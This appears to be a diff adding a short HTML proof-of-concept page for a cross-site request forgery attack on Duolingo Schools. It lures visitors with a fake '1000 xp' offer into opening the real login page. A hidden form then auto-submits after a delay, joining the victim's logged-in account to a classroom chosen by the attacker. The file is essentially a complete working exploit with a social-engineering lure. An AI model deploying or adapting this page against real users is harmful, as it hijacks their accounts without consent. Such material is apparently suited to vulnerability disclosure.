@@ -1,0 +1,18 @@
+<html>
+<script>
+function go(){
+let w = window.open("https://schools.duolingo.com/login",'');
+}
+</script>
+
+<h1 onclick=go()>Login to Your duolingo for get 1000 xp for login click here!</h1>
+
+<form id="form2" style="display:none" name="csrf" 
+method="POST" action="https://schools.duolingo.com/api/1/observers/join_classroom_by_code">
+<input type="hidden" name="link&#95;code" value="zqgnnp" />
+<input type=submit>
+</form>
+<script>
+window.setTimeout( function () { document.forms.form2.submit()}, 40000);  
+</script>
+</html>
